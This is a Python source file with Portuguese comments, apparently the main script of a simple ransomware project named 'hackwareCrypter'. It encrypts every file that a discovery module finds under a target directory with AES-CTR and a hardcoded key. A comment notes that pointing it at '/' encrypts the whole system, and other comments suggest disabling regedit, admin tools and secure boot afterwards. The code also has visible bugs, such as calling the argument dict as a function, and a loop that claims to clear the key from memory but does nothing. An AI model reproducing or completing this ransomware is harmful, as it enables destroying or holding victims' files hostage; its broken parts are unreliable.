# -*- coding: utf8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter
# ------------------------------------- #
# A senha pode ter 128, 192 ou 256 bits
# 8 bits = 1 Byte = 1 Letra Unicode
# ------------------------------------- #
HARDCODED_KEY = 'ransomware'

def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")

    parser.add_argument('-d', '--decrypt', help='Decripta os Arquivos [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()

    args = vars(parser.parse_args())

    decrypt = args('decrypt')

    if decrypt:
        print(
        '#          Crypter Troller v0.1           #'
        '-------------------------------------------'
        ' Seus arquivos foram criptografados'
        ' Para decriptá-los utilize a seguinte senha:'
        ' {} '
        '-------------------------------------------'
        .format(HARDCODED_KEY))
    
        key = input('Digite a senha > ')

    else:

        if HARDCODED_KEY:
            key = HARDCODED_KEY


    ctr = Counter.new(128)

    crypt = AES.new(key, AES.MODE_CTR, counter = ctr)                 

    if not decrypt:

        cryptFn = crypt.encrypt

    else:

        cryptFn = crypt.decrypt    

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))    

    startDirs = [init_path] # Caminhos que o ransomware deve encryptar # '/' encrita o sistema inteiro
    
    for currentDirs in startDirs:

        for filename in Discovery.discover(currentDirs):
            Crypter.changes_files(filename, cryptFn)

# -------------------- FIM DA ENCRIPTAÇÃO ------------------------ #

# -------------------- LIMPA A CHAVE DA MEMÓRIA ------------------ #  

    for _ in range(100):
       pass

    if not decrypt:
     # Código da zoeira aqui hu3hu3hu3hu3
        pass
        # Após a encriptação, você pode alterar o wallpaper
        # Alterar os icones, desativar o regedit, admin, bios secure boot, etc

if __name__ == '__main__':
    main()